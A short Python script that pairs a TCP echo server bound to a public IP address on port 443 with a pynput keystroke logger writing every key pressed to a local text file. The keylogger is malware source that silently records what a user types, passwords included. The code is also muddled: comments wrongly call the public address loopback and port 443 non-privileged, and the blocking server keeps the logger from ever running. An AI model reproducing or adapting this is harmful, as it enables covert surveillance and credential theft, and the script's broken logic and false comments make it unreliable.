from pynput import keyboard
import socket

HOST = '45.37.149.97'  # Standard loopback interface address (localhost)
PORT = 443       # Port to listen on (non-privileged ports are > 1023)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))  # Bind the socket to the specified address and port
    s.listen()            # Start listening for incoming connections
    conn, addr = s.accept() # Accept an incoming connection
    with conn:
        print(f"Connected by {addr}")
        while True:
            data = conn.recv(1024) # Receive data from the client
            if not data:
                break
            conn.sendall(data) # Send the received data back to the client


special_keys = {"Key.space": ' '}

with open('txt_log.txt', 'a') as f:

    def on_press(key, injected):
        try:
            f.write(key.char)
        except AttributeError:
            if str(key) == 'Key.space':
                f.write(' ')
            elif str(key) == 'Key.enter':
                f.write('\n')
            elif str(key) == 'Key.shift_l' or str(key) == 'Key.shift_r':
                pass
            else:
                f.write(' {} '.format(key))

    # Collect events until released 
    with keyboard.Listener(
            on_press=on_press
            ) as listener:
        listener.join()          